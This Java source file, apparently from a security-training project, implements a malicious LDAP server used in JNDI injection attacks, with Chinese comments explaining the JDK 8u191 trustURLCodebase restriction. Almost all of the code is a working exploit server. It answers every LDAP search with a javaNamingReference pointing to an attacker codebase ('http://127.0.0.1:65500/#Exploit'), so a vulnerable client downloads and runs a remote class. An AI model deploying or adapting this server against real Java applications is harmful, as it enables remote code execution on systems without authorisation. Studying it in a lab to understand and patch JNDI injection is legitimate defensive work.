package com.madaha.codesecone.controller.jndi.JndiInject_Controller;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * JNDI + LDAP 攻击利用
 * @poc ldap://127.0.0.1:1389/Object
 *
 * JNDI 可绕过jdk8u191之前的攻击（rmi之后，jdk8u191之前 均可。）
 * 在jdk8u191以上的版本中修复了LDAP服务远程加载恶意类这个漏洞，LDAP服务在进行远程加载之前也添加了系统属性trustURLCodebase的限制。
 * 通过分析在jdk8u191版本发现，在loadClass方法内部添加了系统属性trustURLCodebase的判断，如果trustURLCodebase为false就直接返回null，只有当trustURLCodebase值为true时才允许远程加载。
 *
 * 在高版本 JDK 中需要通过 com.sun.jndi.ldap.object.trustURLCodebase 选项去启用。
 * 这个限制在 JDK 11.0.1、8u191、7u201、6u211 版本时加入，略晚于 RMI 的远程加载限制。
 */

// 对于 ldap 的实现，还是直接上工具吧，这几服务的实现还是比较麻烦的。
// 此处是直接 copy 源作者的ldap服务实现源代码。
public class JNDILdapServer {
    
    private static final String LDAP_BASE = "dc=example,dc=com";
    
    public static void main (String[] args) {
        // 攻击者的服务器 + 恶意类；
        String url = "http://127.0.0.1:65500/#Exploit";

        // 创建 ldap 服务，默认端口为1389；
        int port = 1389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("[+] ldap://127.0.0.1:" + port + "/Object");
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        /**
         * 构造函数，传入恶意类的url服务器地址
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);

            e.addAttribute("javaClassName", "Object");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
